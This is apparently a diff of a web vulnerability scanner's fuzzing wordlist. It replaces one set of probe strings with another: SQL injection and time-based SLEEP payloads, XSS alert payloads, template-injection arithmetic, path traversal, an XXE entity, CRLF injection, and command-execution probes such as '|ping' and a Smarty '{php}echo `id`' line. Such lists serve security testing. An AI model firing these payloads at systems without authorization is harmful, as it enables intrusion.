@@ -1,23 +1,44 @@
 '
 "
-%27
-&#x27;
-\x27
-\u0027
-'+OR+1=1--
-&bsol;
-SLEEP(1) /*’ or SLEEP(1) or’” or SLEEP(1) or “*/
+`
 #
+//
+[]
 {}
+||
+&&
+^_*$
 %00
+%2527
+%ff%fe
+\u0027
+&bsol;
+" tabindex=1 onfocus=alert(1) x="
+\"-alert(1)}//
+"><img/src=ElectricYellow onerror=alert(1)>
+#{15668*2}
+${15668*2}
+${{15668*2}}
+}}{{15668*2}}
+<%= 15668*2 %>
+${{<%[%'"{{%\
+{{8*8}}[[5*5]]${7*4}
+../../../
+..\..\..\
+null
+undefined
+electricYellow()
+${class.getResource("").getPath()}
+__init__.__globals__["{module}"].config
+<?xml version="1.0" encoding="utf-8?>
+<!DOCTYPE xxe [<!ENTITY foo "ElectricYellow">]><root>&foo;</root>
+%0d%0a%0d%0aelectric: yellow
+Electric",'|&$;:`({@<%=Yellow
+' OR 1=1-- -
+SLEEP(10) /*’ or SLEEP(10) or’” or SLEEP(10) or “*/
+a'a\'b"c>?>%}}%%>c<[[?${{%}}ElectricYellow\
 http://
-../../
-..\..\
+{% debug %}
+{php}echo `id`;{/php}
 |ping -c 30 127.0.0.1
 ~'!@#$%^&?*:()[]|\-_+,./
-${{<%[%'"{{%\
-<s>CANARY_STRINGZZ
-"><img src=CANARY_STRINGZZ onerror=alert(document.domain)>
-" tabindex=1 onfocus=alert(1) x="
-<img/src=http://{domain}>
-{{8*8}}[[5*5]]${7*4}
